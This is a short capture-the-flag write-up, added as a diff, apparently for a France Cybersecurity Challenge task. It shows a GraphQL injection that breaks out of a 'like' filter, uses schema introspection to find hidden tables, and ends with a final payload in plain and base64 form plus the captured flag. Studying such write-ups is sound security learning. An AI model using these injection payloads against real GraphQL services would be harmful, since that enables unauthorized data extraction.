@@ -1,0 +1,18 @@
+http://challenges2.france-cybersecurity-challenge.fr:5007/index.php
+
+after some errors trying to escape we see errors and decalage in number of error so more chars in request
+= somethhing more is tested
+
+query online the filter b64 encoded
+
+{ allCooks (filter: {or: [{firstname: {like: "%input%"}}, {lastname: {like: "%input%"}}]}) { nodes { firstname, lastname, speciality, price }}}
+
+%"}}]}) { nodes { firstname } } __schema { types { name } } } #
+
+-> we get allFlagNotTheSameTableNames and flagNotTheSameFieldName by trying
+
+final payload:
+%"}}]}) { nodes { firstname } } allFlagNotTheSameTableNames { nodes { flagNotTheSameFieldName } } } #
+JSJ9fV19KSB7IG5vZGVzIHsgZmlyc3RuYW1lIH0gfSBhbGxGbGFnTm90VGhlU2FtZVRhYmxlTmFtZXMgeyBub2RlcyB7IGZsYWdOb3RUaGVTYW1lRmllbGROYW1lIH0gfSB9ICM=
+
+FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}
